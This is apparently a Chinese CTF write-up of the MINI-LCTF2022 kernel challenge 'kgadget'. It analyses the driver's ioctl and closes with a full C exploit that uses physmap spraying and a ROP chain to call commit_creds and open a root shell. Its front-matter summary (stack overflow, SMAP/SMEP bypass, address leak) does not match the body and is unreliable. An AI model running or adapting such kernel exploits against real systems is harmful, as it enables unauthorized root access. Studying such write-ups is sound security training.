---
title: "[MINI-LCTF2022]kgadget"
slug: mini-lctf2022-kgadget
description: "MINI-LCTF2022 kgadget 是一道 Linux 内核 pwn 题，通过内核模块中的栈溢出与 ROP 链构造提权，涉及 SMAP/SMEP 绕过与内核地址泄露。"
date: 2026-09-21
author: mixt
category: linux kernel pwn
tags: [linux kernel pwn, ret2dir, 堆喷, nokaslr]
featured: false
draft: false
---
# 一.函数分析

### kgadget_ioctl

```kgadget_ioctl
__int64 __fastcall kgadget_ioctl(file *__file, unsigned int cmd, unsigned __int64 param)
{
  void (__fastcall **v3)(void *, _QWORD); // rdx
  void (__fastcall *v4)(void *, _QWORD); // rbx
  void (__fastcall *v5)(void *, _QWORD); // rsi

  _fentry__(__file, cmd, param);
  if ( cmd == 114514 )
  {
    v4 = *v3;
    v5 = *v3;
    printk(&unk_370);
    printk(&unk_3A0);
    qmemcpy(
      (void *)(((unsigned __int64)&STACK[0x1000] & 0xFFFFFFFFFFFFF000LL) - 168),
      "arttnba3arttnba3arttnba3arttnba3arttnba3arttnba3",
      48);
    *(_QWORD *)(((unsigned __int64)&STACK[0x1000] & 0xFFFFFFFFFFFFF000LL) - 112) = 0x3361626E74747261LL;
    printk(&unk_3F8);
    v4(&unk_3F8, v5);
    return 0;
  }
  else
  {
    printk(&unk_420);
    return -1;
  }
}
```

---

__`__fentry__`__是内核`ftrace`函数追踪的入口钩子，分析时可以忽略

> 这是唯一有用的函数

* qmemcpy的操作有些迷惑，看不太懂

```qmemcpy
.text.unlikely:000000000000011C                 mov     rbx, [param]
.text.unlikely:000000000000011F kgadget_ptr = rbx                       ; void (*)(void)
.text.unlikely:000000000000011F                 mov     __file, offset unk_370
.text.unlikely:0000000000000126                 mov     cmd, kgadget_ptr
.text.unlikely:0000000000000129                 call    printk          ; PIC mode
.text.unlikely:000000000000012E                 mov     rdi, offset unk_3A0
.text.unlikely:0000000000000135                 call    printk          ; PIC mode
.text.unlikely:000000000000013A                 mov     [rbp-18h], rsp
.text.unlikely:000000000000013E                 mov     rax, [rbp-18h]
.text.unlikely:0000000000000142                 mov     rdi, offset unk_3F8
.text.unlikely:0000000000000149                 add     rax, 1000h
.text.unlikely:000000000000014F                 and     rax, 0FFFFFFFFFFFFF000h
.text.unlikely:0000000000000155                 lea     rdx, [rax-0A8h] #0A8h = 168
.text.unlikely:000000000000015C                 mov     [rbp-18h], rdx
.text.unlikely:0000000000000160 regs = rdx                              ; pt_regs *
.text.unlikely:0000000000000160                 mov     regs, 3361626E74747261h #arttnba3
.text.unlikely:000000000000016A                 mov     [rax-0A8h], rdx
.text.unlikely:0000000000000171                 mov     [rax-0A0h], rdx
.text.unlikely:0000000000000178                 mov     [rax-98h], rdx
.text.unlikely:000000000000017F                 mov     [rax-90h], rdx
.text.unlikely:0000000000000186                 mov     [rax-88h], rdx
.text.unlikely:000000000000018D                 mov     [rax-80h], rdx
.text.unlikely:0000000000000191                 mov     [rax-70h], rdx #70h = 112
.text.unlikely:0000000000000195                 call    printk          ; PIC mode
.text.unlikely:000000000000019A                 call    __x86_indirect_thunk_rbx ; PIC mode
.text.unlikely:000000000000019F                 xor     eax, eax
.text.unlikely:00000000000001A1                 jmp     short loc_1B3
```

逐步分析一下吧

`param=rdx`，那么`rbx=[rdx]`，最后会`call rbx`，所以只需要让`rdx`为`physmap`中用户段ROP的地址即可

`rax = rsp`，`rax += 1000h`，`nd rax, 0FFFFFFFFFFFFF000h`，`现在rax还是页对齐的栈地址`

`lead rdx, [rax-0A8h] ; mov [rbp-18h], rdx`这两步是存个地址吧

后面一堆`mov就是纯qmemcpy`的赋值操作了，`rdx`为`arttnba3`，在栈上放7个`arttnba3`。。。

它清理了`pt_regs`区域

备注：`pt_regs`是在进行系统调用切换到内核态时形成的结构体

---



### kgadget_write

```kgadget_write
__int64 __fastcall kgadget_write(__int64 a1, __int64 a2)
{
  _fentry__(a1, a2);
  raw_spin_lock(&spin);
  printk(&unk_440);
  pv_ops[85](&spin);
  return -14;
}
```

---

`raw_spin_lock(&spin)`获取一个自旋锁，spin是全局变量，用于保护临界区，防止多核并发访问

`pv_ops[85](&spin)`其中`pv_ops`是一个虚表，用于在虚拟化环境执行某些操作

> 这里不知道虚表里面85到底代表什么操作，初步推断是自旋锁的相关操作
>
> 经过分析可以看到这个函数没用

---



### kgadget_read

```kgadget_read
ssize_t __fastcall kgadget_read(file *__file, char *user_buf, size_t size, loff_t *__loff)
{
  _fentry__(__file, user_buf);
  raw_spin_lock(&spin);
  printk(&unk_440);
  pv_ops[85](&spin);
  return -14;
}
```

---

> 这个函数没用

---



### kgadget_open

```kgadget_open
int __fastcall kgadget_open(inode *__inode, file *__file)
{
  _fentry__(__inode, __file);
  raw_spin_lock(&spin);
  printk(&unk_6C4);
  pv_ops[85](&spin);
  return 0;
}
```

> 这个函数也没用

# 二.思路

就是在exp中用`mmap申请大量区域（堆喷）`

并整页整页的布置ROP

然后再在`physmap`区域中随便蒙一个地址(`physmap spary`)

这样很大概率就能蒙到那个`add_rsp_a0_pop_rbx_r12_r13_rbp_ret`

那么`rsp`是怎么跳到`mmap`页内执行ROP的呢？

在内核栈的最高端有一个`pt_regs结构体 `，驱动被调用时，内核栈只有一页，`rsp`与它的距离不远

利用这个`gadget`偏移到`pt_regs`内跳到`r9 = pop rsp ; ret`，`r8 = try_hit`

```1
for(;idx < (page_size/8 - 0x30);idx++){
        rop[idx]=add_rsp_a0_pop_rbx_r12_r13_rbp_ret;
    }
```

保证了`rsp`的步长

```2
for(;idx < (page_size/8 - 0x10);idx++){
        rop[idx]=ret;
    }
```

在这里布置`ret`区域防止`rsp`掠过真`ROP链`

最后由于题目开启了`pti = on`导致手搓的`swaps ; iretq`没切`CR3`

必须用内部函数把`CR3页表`切回用户态才行

# 三.Exploit

```c
#include <stdio.h>
#include <sys/mman.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>

size_t commit_creds = 0xffffffff810c92e0;
size_t init_cred =  0xffffffff82a6b700;
size_t pop_rdi = 0xffffffff8108c6f0;
size_t add_rsp_a0_pop_rbx_r12_r13_rbp_ret = 0xffffffff810737fe;
size_t pop_rsp = 0xffffffff811483d0;
size_t ret = 0xffffffff810001fc;
size_t return_to_usermode = 0xffffffff81c00fb0  + 27;
size_t iretq = 0xffffffff810002df;
size_t user_cs,user_rflags,user_sp,user_ss;
int dev_fd;
size_t page_size;    
size_t try_hit;
size_t *physmap_spray_array[16000];

void save_stats(){
    __asm__(
        "mov user_cs,cs;"
        "mov user_ss,ss;"
        "mov user_sp,rsp;"
        "pushf;"
        "pop user_rflags;"
        );
}

void get_shell(){
    write(1, "entered\n", 8);
    if(getuid()){
        exit(EXIT_FAILURE);
    }
    write(1,"root!\n",6);
    system("/bin/sh");
    exit(EXIT_SUCCESS);
}

void ConstructRopchian(size_t* rop){
    int idx = 0;
    for(;idx < (page_size/8 - 0x30);idx++){
        rop[idx]=add_rsp_a0_pop_rbx_r12_r13_rbp_ret;
    }
    for(;idx < (page_size/8 - 0x10);idx++){
        rop[idx]=ret;
    }
    rop[idx++]=pop_rdi;
    rop[idx++]=init_cred;
    rop[idx++]=commit_creds;
    rop[idx++]=return_to_usermode;
    rop[idx++]=*(size_t*)"Mixt";
    rop[idx++]=*(size_t*)"Mixt";
    rop[idx++]=(size_t)get_shell;
    rop[idx++]=user_cs;
    rop[idx++]=user_rflags;
    rop[idx++]=user_sp + 8;
    rop[idx++]=user_ss;
}

int main(int argc,char **argv){
    save_stats();
    dev_fd = open("/dev/kgadget",O_RDWR);
    page_size = sysconf(_SC_PAGESIZE);
    physmap_spray_array[0]=mmap(NULL,page_size,PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    ConstructRopchian(physmap_spray_array[0]);
    for(int i = 1;i< 15000;i++){
        physmap_spray_array[i]=mmap(NULL,page_size,PROT_READ | PROT_WRITE,MAP_PRIVATE | MAP_ANONYMOUS, -1 ,0);
        memcpy(physmap_spray_array[i],physmap_spray_array[0],page_size);
    }
    try_hit = 0xffff888000000000 + 0x7000000;
    __asm__(
        "mov r8, try_hit;"
        "mov r9, pop_rsp;"
        "mov rax, 0x10;"
        "mov rdx, try_hit;"
        "mov rsi, 0x1bf52;"
        "mov rdi, dev_fd;"
        "syscall;"
        );
}```






